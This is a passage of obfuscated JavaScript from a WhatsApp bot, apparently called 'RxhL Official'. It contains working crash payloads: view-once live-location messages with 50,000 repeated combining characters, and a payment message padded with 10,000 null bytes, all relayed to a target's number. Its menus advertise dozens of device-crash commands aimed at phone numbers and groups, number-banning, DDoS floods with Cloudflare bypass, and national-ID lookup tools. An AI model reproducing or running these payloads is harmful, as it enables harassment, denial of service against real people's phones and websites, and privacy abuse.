      var _0x459cde = generateWAMessageFromContent(_0x2b0201, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': " 𝕽𝖝𝖍𝕷 🔥" + "⃍⃤⃖⃖⃡⃩".repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x2b0201
      });
      await _0x2f9d2e.relayMessage(_0x2b0201, _0x459cde.message, {
        'participant': {
          'jid': _0x2b0201
        },
        'messageId': _0x459cde.key.id
      });
    }
    async function _0x4c56ea(_0x395a47) {
      var _0x3e82ed = generateWAMessageFromContent(_0x395a47, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "Ø‚Ù†ۖۗۡۚۖۗۡۚ„Ù½" + "ۖۗۡۚ".repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x395a47
      });
      await _0x2f9d2e.relayMessage(_0x395a47, _0x3e82ed.message, {
        'participant': {
          'jid': _0x395a47
        },
        'messageId': _0x3e82ed.key.id
      });
    }
    async function _0x4a505c(_0x47330a) {
      const _0x5b9a00 = {
        hasMediaAttachment: true,
        sequenceNumber: '0',
        jpegThumbnail: ''
      };
      var _0xf88201 = generateWAMessageFromContent(_0x47330a, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': _0x5b9a00,
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "review_and_pay",
                  'buttonParamsJson': "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k" + _0x4bbbca + ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
                }],
                'messageParamsJson': "\0".repeat(10000)
              }
            }
          }
        }
      }), {
        'userJid': _0x47330a
      });
      await _0x2f9d2e.relayMessage(_0x47330a, _0xf88201.message, {
        'participant': {
          'jid': _0x47330a
        },
        'messageId': _0xf88201.key.id
      });
    }
    async function _0x5a342a(_0x144804) {
      var _0x307b60 = generateWAMessageFromContent(_0x144804, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'newsletterAdminInviteMessage': {
              'newsletterJid': "120363224727390375@newsletter",
              'newsletterName': _0x4bbbca,
              'jpegThumbnail': '',
              'caption': "By RxhL",
              'inviteExpiration': Date.now() + 1814400000
            }
          }
        }
      }), {
        'userJid': _0x144804
      });
      await _0x2f9d2e.relayMessage(_0x144804, _0x307b60.message, {
        'participant': {
          'jid': _0x144804
        },
        'messageId': _0x307b60.key.id
      });
    }
    async function _0x5d6a46(_0x37583d) {
      const _0x5f519c = {
        hasMediaAttachment: true,
        sequenceNumber: '0',
        jpegThumbnail: ''
      };
      var _0x5a5d84 = generateWAMessageFromContent(_0x37583d, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': _0x5f519c,
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "review_and_pay",
                  'buttonParamsJson': "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k" + _0x4bbbca + ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
                }],
                'messageParamsJson': "\0".repeat(10000)
              }
            }
          }
        }
      }), {
        'userJid': _0x37583d
      });
      await _0x2f9d2e.relayMessage(_0x37583d, _0x5a5d84.message, {
        'participant': {
          'jid': _0x37583d
        },
        'messageId': _0x5a5d84.key.id
      });
    }
    async function _0x315e18(_0x577228) {
      var _0x31a1a5 = generateWAMessageFromContent(_0x577228, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'newsletterAdminInviteMessage': {
              'newsletterJid': "120363224727390375@newsletter",
              'newsletterName': _0x4bbbca,
              'jpegThumbnail': '',
              'caption': "By RxhL",
              'inviteExpiration': Date.now() + 1814400000
            }
          }
        }
      }), {
        'userJid': _0x577228
      });
      await _0x2f9d2e.relayMessage(_0x577228, _0x31a1a5.message, {
        'participant': {
          'jid': _0x577228
        },
        'messageId': _0x31a1a5.key.id
      });
    }
    async function _0x48a831(_0x223069) {
      const _0x224780 = {
        degreesLatitude: 'p',
        degreesLongitude: 'p',
        caption: _0x4bbbca,
        sequenceNumber: '0',
        jpegThumbnail: ''
      };
      const _0x524622 = {
        liveLocationMessage: _0x224780
      };
      const _0x276663 = {
        message: _0x524622
      };
      const _0xe56660 = {
        viewOnceMessage: _0x276663
      };
      var _0xac5db2 = generateWAMessageFromContent(_0x223069, proto.Message.fromObject(_0xe56660), {
        'userJid': _0x223069
      });
      await _0x2f9d2e.relayMessage(_0x223069, _0xac5db2.message, {
        'participant': {
          'jid': _0x223069
        },
        'messageId': _0xac5db2.key.id
      });
    }
    const _0x2d6da8 = {
      remoteJid: _0x537416
    };
    const _0x4afa65 = {
      'fromMe': false,
      'participant': "0@s.whatsapp.net",
      ...(_0x18a4d7.chat ? _0x2d6da8 : {})
    };
    const _0x9c6e96 = {
      text: _0x4bbbca,
      degreesLatitude: 'p',
      degreesLongitude: 'p',
      jpegThumbnail: _0x3a5321
    };
    const _0x1709d4 = {
      extendedTextMessage: _0x9c6e96
    };
    const _0x565e47 = {
      key: _0x4afa65,
      message: _0x1709d4
    };
    const _0x41d276 = _0x2ea84a => {
      const _0x24e32f = {
        mentionedJid: [_0x18a4d7.sender],
        externalAdReply: {}
      };
      _0x24e32f.externalAdReply.showAdAttribution = false;
      _0x24e32f.externalAdReply.renderLargerThumbnail = false;
      _0x24e32f.externalAdReply.title = "© RxhlOfc";
      _0x24e32f.externalAdReply.body = "Halo " + _0x18a4d7.pushName + " 👋";
      _0x24e32f.externalAdReply.previewType = "VIDEO";
      _0x24e32f.externalAdReply.thumbnail = _0x3a5321;
      _0x24e32f.externalAdReply.sourceUrl = "https://youtube.com/@rxhlofc";
      _0x24e32f.externalAdReply.mediaUrl = "https://youtube.com/@rxhlofc";
      const _0x4f58a1 = {
        text: _0x2ea84a,
        contextInfo: _0x24e32f,
        text: _0x2ea84a
      };
      const _0x3ab4e4 = {
        quoted: _0x18a4d7
      };
      _0x2f9d2e.sendMessage(_0x537416, _0x4f58a1, _0x3ab4e4);
    };
    const _0x2ea524 = _0x5a4f1b => {
      const _0x69bc32 = {
        image: _0x3a5321,
        caption: _0x5a4f1b
      };
      const _0x30b020 = {
        quoted: _0x18a4d7
      };
      _0x2f9d2e.sendMessage(_0x537416, _0x69bc32, _0x30b020);
    };
    const _0x5df05d = async _0x4e2dcd => {
      try {
        await _0xaf6616.getInfo(_0x4e2dcd);
        let _0x5a2f37 = getRandom(".mp3");
        _0xaf6616(_0x4e2dcd, {
          'filter': "audioonly"
        }).pipe(fs.createWriteStream(_0x5a2f37)).on("finish", async () => {
          await _0x2f9d2e.sendMessage(_0x18a4d7.chat, {
            'audio': fs.readFileSync(_0x5a2f37),
            'mimetype': "audio/mp4"
          }, {
            'quoted': _0x18a4d7
          });
          fs.unlinkSync('./' + _0x5a2f37);
        });
      } catch (_0x3701f9) {
        _0x41d276('' + _0x3701f9);
      }
    };
    const _0x312299 = {
      remoteJid: "status@broadcast"
    };
    const _0xcc731d = {
      'participant': "0@s.whatsapp.net",
      ...(_0x18a4d7.chat ? _0x312299 : {})
    };
    const _0x177c6c = {
      title: "Rxhl Official 💸"
    };
    const _0x7c4329 = {
      listResponseMessage: _0x177c6c
    };
    const _0x3d3d7e = {
      key: _0xcc731d,
      message: _0x7c4329
    };
    switch (_0x63bd7f) {
      case "menu":
        await _0x333a9e();
        ewe = "\n*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n \n ⌜ 𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁 ⌟\n ➵ " + _0x11f9b4 + "bugmenu\n ➵ " + _0x11f9b4 + "specialmenuvip \n ➵ " + _0x11f9b4 + "aksesmenu\n ➵ " + _0x11f9b4 + "soundmenu\n ➵ " + _0x11f9b4 + "groupmenu\n ➵ " + _0x11f9b4 + "stickermenu\n ➵ " + _0x11f9b4 + "downloadmenu\n ➵ " + _0x11f9b4 + "toolsmenu\n ➵ " + _0x11f9b4 + "asupanmenu\n ➵ " + _0x11f9b4 + "rxhlmenu\n ➵ " + _0x11f9b4 + "jbmenu\n ➵ " + _0x11f9b4 + "txtmenu\n ➵ " + _0x11f9b4 + "infobot";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "specialmenuvip":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n \n ⌜ 𝗗𝗱𝗼𝘀 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "ddosv1 *website duration*\n ➵ " + _0x11f9b4 + "d-fetch *url time*\n ➵ " + _0x11f9b4 + "egao *url time rps thread*\n ➵ " + _0x11f9b4 + "mix *url time rps thread*\n ➵ " + _0x11f9b4 + "floods *url time rps thread*\n ➵ " + _0x11f9b4 + "kilua *url time rps thread*\n ➵ " + _0x11f9b4 + "xchrome *url time rps thread*\n ➵ " + _0x11f9b4 + "tls *url time rps thread*\n ➵ " + _0x11f9b4 + "tls-v2 *url time rps thread*\n ➵ " + _0x11f9b4 + "tls-bypass *url time rps thread*\n ➵ " + _0x11f9b4 + "bypass-cf *url time rps thread*\n ➵ " + _0x11f9b4 + "tls-vip *url time rps thread*\n\n ⌜ 𝗩𝗜𝗣 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "nikparser *nik*\n ➵ " + _0x11f9b4 + "getnik \n ➵ " + _0x11f9b4 + "enc *kode*";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "bugmenu":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n \n ⌜ 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "bugmenu-owner\n ➵ " + _0x11f9b4 + "bugmenu-owner2\n ➵ " + _0x11f9b4 + "bugmenu-murbug \n ➵ " + _0x11f9b4 + "bugmenu-murbug2\n";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "bugmenu-murbug":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝗩𝗶𝗿𝘁𝗲𝘅 𝗖𝗿𝗮𝘀𝗵 ⌟\n ➵ " + _0x11f9b4 + "virtex-jids *+628xxx*\n ➵ " + _0x11f9b4 + "virtex-mention *+628xxx*\n ➵ " + _0x11f9b4 + "virtex-memory *+628xxx*\n ➵ " + _0x11f9b4 + "virtex-null *+628xxx*\n ➵ " + _0x11f9b4 + "virtex-undefined *+628xxx*\n ➵ " + _0x11f9b4 + "virtex-ganas *+628xxx*\n ➵ " + _0x11f9b4 + "virtex-ui *+628xxx*\n ➵ " + _0x11f9b4 + "virtex-system *+628xxx*\n ➵ " + _0x11f9b4 + "virtex-vip *+628xxx*\n\n ⌜ 𝗗𝗮𝗿𝗸𝗻𝗲𝘀𝘀 𝗖𝗿𝗮𝘀𝗵 ⌟\n ➵ " + _0x11f9b4 + "darkness-jids *+628xxx*\n ➵ " + _0x11f9b4 + "darkness-mention *+628xxx*\n ➵ " + _0x11f9b4 + "darkness-memory *+628xxx*\n ➵ " + _0x11f9b4 + "darkness-null *+628xxx*\n ➵ " + _0x11f9b4 + "darkness-undefined *+628xxx*\n ➵ " + _0x11f9b4 + "darkness-ganas *+628xxx*\n ➵ " + _0x11f9b4 + "darkness-ui *+628xxx*\n ➵ " + _0x11f9b4 + "darkness-system *+628xxx*\n ➵ " + _0x11f9b4 + "darkness-vip *+628xxx*\n\n ⌜ 𝗚𝗮𝘀 𝗖𝗿𝗮𝘀𝗵 ⌟\n ➵ " + _0x11f9b4 + "gas-unex-a *+628xxx*\n ➵ " + _0x11f9b4 + "gas-unex-b *+628xxx*\n ➵ " + _0x11f9b4 + "gas-unex-c *+628xxx*\n ➵ " + _0x11f9b4 + "gas-unex-d *+628xxx*\n ➵ " + _0x11f9b4 + "gas-unex-e *+628xxx*\n ➵ " + _0x11f9b4 + "gas-unex-f *+628xxx*\n ➵ " + _0x11f9b4 + "gas-unex-g *+628xxx*\n ➵ " + _0x11f9b4 + "gas-unex-h *+628xxx*\n ➵ " + _0x11f9b4 + "gas-unex-i *+628xxx*\n\n ⌜ 𝗜𝗽𝗵𝗼𝗻𝗲 𝗖𝗿𝗮𝘀𝗵 ⌟\n ➵ " + _0x11f9b4 + "gasin-ip *+628xxx*\n\n ⌜ 𝗦𝘁𝗿𝗼𝗻𝗴 𝟴𝟬% 𝗖𝗿𝗮𝘀𝗵 ⌟\n ➵ " + _0x11f9b4 + "strong-jids *+628xxx*\n ➵ " + _0x11f9b4 + "strong-mention *+628xxx*\n ➵ " + _0x11f9b4 + "strong-memory *+628xxx*\n ➵ " + _0x11f9b4 + "strong-null *+628xxx*\n ➵ " + _0x11f9b4 + "strong-undefined *+628xxx*\n ➵ " + _0x11f9b4 + "strong-ganas *+628xxx*\n ➵ " + _0x11f9b4 + "strong-ui *+628xxx*\n ➵ " + _0x11f9b4 + "strong-system *+628xxx*\n ➵ " + _0x11f9b4 + "strong-vip *+628xxx*\n\n ⌜ 𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻 𝟵𝟵% 𝗖𝗿𝗮𝘀𝗵 ⌟\n ➵ " + _0x11f9b4 + "location-jids *+628xxx*\n ➵ " + _0x11f9b4 + "location-memory *+628xxx*\n ➵ " + _0x11f9b4 + "location-ganas *+628xxx*\n ➵ " + _0x11f9b4 + "location-ui *+628xxx*\n ➵ " + _0x11f9b4 + "location-system *+628xxx*\n ➵ " + _0x11f9b4 + "location-vip *+628xxx*\n\n> © Rxhl OfficiaL";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "bugmenu-owner":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝟱𝟬% 𝗖𝗿𝗮𝘀𝗵 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "bugcrash *+628xxx*\n ➵ " + _0x11f9b4 + "bugsystem *+628xxx*\n ➵ " + _0x11f9b4 + "crash1jam *+628xxx*\n ➵ " + _0x11f9b4 + "crash1hari *+628xxx*\n ➵ " + _0x11f9b4 + "xreactpc *+628xxx*\n ➵ " + _0x11f9b4 + "bugiospc *+628xxx*\n ➵ " + _0x11f9b4 + "bugaudiopc *+628xxx*\n ➵ " + _0x11f9b4 + "buglocpc *+628xxx*\n ➵ " + _0x11f9b4 + "bugparamspc *+628xxx*\n ➵ " + _0x11f9b4 + "bughomepc *+628xxx*\n ➵ " + _0x11f9b4 + "rxhlandro *+628xxx*\n ➵ " + _0x11f9b4 + "rxhlbug *628xxx*\n ➵ " + _0x11f9b4 + "rxhlkeren *+628xxx*\n ➵ " + _0x11f9b4 + "rxhlganteng *+628xxx*\n ➵ " + _0x11f9b4 + "bannedno *+628xxx*\n ➵ " + _0x11f9b4 + "iosfull *+628xxx*\n ➵ " + _0x11f9b4 + "iosfullv2 *+628xxx*\n ➵ " + _0x11f9b4 + "samsungcrash *+628xxx*\n ➵ " + _0x11f9b4 + "samsungfull *+628xxx*\n ➵ " + _0x11f9b4 + "samsung-brutal *+628xxx*\n ➵ " + _0x11f9b4 + "slayer07 *+628xxx*\n ➵ " + _0x11f9b4 + "darkness *+628xxx*\n ➵ " + _0x11f9b4 + "virkon *+628xxx*\n ➵ " + _0x11f9b4 + "virgam *+628xxx*\n ➵ " + _0x11f9b4 + "fatal-ui *+628xxx*\n ➵ " + _0x11f9b4 + "fatal-notif *+628xxx*\n ➵ " + _0x11f9b4 + "bug-brutal *+628xxx*\n ➵ " + _0x11f9b4 + "crash-all-dvc *+628xxx*\n\n ⌜ 𝟳𝟬% 𝗖𝗿𝗮𝘀𝗵 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "all-dvc2 *+628xxx*\n ➵ " + _0x11f9b4 + "killwhatsapp *+628xxx*\n ➵ " + _0x11f9b4 + "auto-crash *+628xxx*\n ➵ " + _0x11f9b4 + "new-bunga *+628xxx*\n ➵ " + _0x11f9b4 + "kill-ripper *+628xxx*\n ➵ " + _0x11f9b4 + "external-crash1 *+628xxx*\n ➵ " + _0x11f9b4 + "external-crash2 *+628xxx*\n ➵ " + _0x11f9b4 + "external-crash3 *+628xxx*\n ➵ " + _0x11f9b4 + "internal-crash1 *+628xxx*\n ➵ " + _0x11f9b4 + "internal-crash2 *+628xxx*\n ➵ " + _0x11f9b4 + "onlyios-crash *+628xxx*\n ➵ " + _0x11f9b4 + "onlysamsung-crash *+628xxx*\n\n ⌜ 𝟴𝟬% 𝗖𝗿𝗮𝘀𝗵 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "bug-vip *+628xxx*\n ➵ " + _0x11f9b4 + "super-vip *+628xxx*\n ➵ " + _0x11f9b4 + "samsung-vip *+628xxx*\n ➵ " + _0x11f9b4 + "oppo-vip *+628xxx*\n ➵ " + _0x11f9b4 + "vivo-vip *+628xxx*\n ➵ " + _0x11f9b4 + "xiaomi-vip *+628xxx*\n ➵ " + _0x11f9b4 + "infinix-vip *+628xxx*\n ➵ " + _0x11f9b4 + "tecno-vip *+628xxx*\n ➵ " + _0x11f9b4 + "jids-engine *+628xxx*\n ➵ " + _0x11f9b4 + "jids-internal *+628xxx*\n ➵ " + _0x11f9b4 + "jids-external *+628xxx*\n ➵ " + _0x11f9b4 + "jids-system *+628xxx*\n ➵ " + _0x11f9b4 + "ipcrash *+628xxx*\n\n ⌜ 𝟭𝟬𝟬% 𝗖𝗿𝗮𝘀𝗵 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "atck-memory *+628xxx*\n ➵ " + _0x11f9b4 + "atck-system *+628xxx*\n ➵ " + _0x11f9b4 + "atck-notif *+628xxx*\n ➵ " + _0x11f9b4 + "atck-ui *+628xxx*\n ➵ " + _0x11f9b4 + "gas-c1 *+628xxx*\n\n ⌜ 𝟵𝟬% 𝗖𝗿𝗮𝘀𝗵 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "🔥  *+628xxx*\n ➵ " + _0x11f9b4 + "♥️  *+628xxx*\n ➵ " + _0x11f9b4 + "🥰  *+628xxx*\n ➵ " + _0x11f9b4 + "🤤  *+628xxx*\n ➵ " + _0x11f9b4 + "😱  *+628xxx*\n ➵ " + _0x11f9b4 + "💝  *+628xxx*\n ➵ " + _0x11f9b4 + "😭  *+628xxx*\n ➵ " + _0x11f9b4 + "😁  *+628xxx*\n ➵ " + _0x11f9b4 + "😡  *+628xxx*\n ➵ " + _0x11f9b4 + "😒  *+628xxx*\n ➵ " + _0x11f9b4 + "🍁 *+628xxx*\n ➵ " + _0x11f9b4 + "✨ *+628xxx*\n ➵ " + _0x11f9b4 + "💯 *+628xxx*\n ➵ " + _0x11f9b4 + "💋 *+628xxx*\n ➵ " + _0x11f9b4 + "👅 *+628xxx*\n ➵ " + _0x11f9b4 + "🌀 *+628xxx*\n ➵ " + _0x11f9b4 + "⚡ *+628xxx*\n\n ⌜ 𝟭𝟬𝟬% 𝗖𝗿𝗮𝘀𝗵 𝗠𝗲𝗻𝘂 𝗚𝗿𝘂𝗽 ⌟\n ➵ " + _0x11f9b4 + "bughomegc *Id Grup|Amount*\n ➵ " + _0x11f9b4 + "crashgc-v1 *Id Grup|Amount*\n ➵ " + _0x11f9b4 + "crashgc-v2 *Id Grup|Amount*\n ➵ " + _0x11f9b4 + "getidgrup *Link Gc*\n\n ⌜ 𝗢𝘁𝗵𝗲𝗿 𝗺𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "bannedno *628xxxx*\n ➵ " + _0x11f9b4 + "tempban  *62|8xxx*\n ➵ " + _0x11f9b4 + "bugvid1\n ➵ " + _0x11f9b4 + "bugvid2\n\n> © Rxhl OfficiaL";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "bugmenu-owner2":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝟭𝟬𝟬% 𝗖𝗿𝗮𝘀𝗵 𝗗𝗶𝘁𝗲𝗺𝗽𝗮𝘁 ⌟\n ➵ " + _0x11f9b4 + "openvcs?\n ➵ " + _0x11f9b4 + "tutordek\n ➵ " + _0x11f9b4 + "nope-bg\n ➵ " + _0x11f9b4 + "hai-jebe\n ➵ " + _0x11f9b4 + "permisi\n ➵ " + _0x11f9b4 + "halo-bro\n \n ⌜ 𝟭𝟬𝟬% 𝗖𝗿𝗮𝘀𝗵 𝗛𝗼𝗺𝗲 ⌟\n ➵ " + _0x11f9b4 + "beta-bug 628xxx\n ➵ " + _0x11f9b4 + "bisnis-bug 628xxx\n ➵ " + _0x11f9b4 + "ori-bug 628xxx\n ➵ " + _0x11f9b4 + "ui-beta 628xxx\n ➵ " + _0x11f9b4 + "spam-beta 628xxx\n ➵ " + _0x11f9b4 + "gasmek 628xxx\n ➵ " + _0x11f9b4 + "tesbeta 628xxx\n ➵ " + _0x11f9b4 + "tesbetav2 628xxx\n > © Rxhl OfficiaL\n ";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "bugmenu-murbug2":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝗧𝘅𝘁 𝗠𝘂𝗿𝗯𝘂𝗴 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "bug-txt1 628xxx\n ➵ " + _0x11f9b4 + "bug-txt2 628xxx\n ➵ " + _0x11f9b4 + "bug-txt3 628xxx\n ➵ " + _0x11f9b4 + "bug-txt4 628xxx\n ➵ " + _0x11f9b4 + "bug-txt5 628xxx\n ➵ " + _0x11f9b4 + "bug-txt6 628xxx\n \n ⌜ 𝗪𝗮 𝗠𝘂𝗿𝗯𝘂𝗴 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "bug-wa1 628xxx\n ➵ " + _0x11f9b4 + "bug-wa2 628xxx\n ➵ " + _0x11f9b4 + "bug-wa3 628xxx\n ➵ " + _0x11f9b4 + "bug-wa4 628xxx\n ➵ " + _0x11f9b4 + "bug-wa5 628xxx\n ➵ " + _0x11f9b4 + "bug-wa6 628xxx\n \n ⌜ 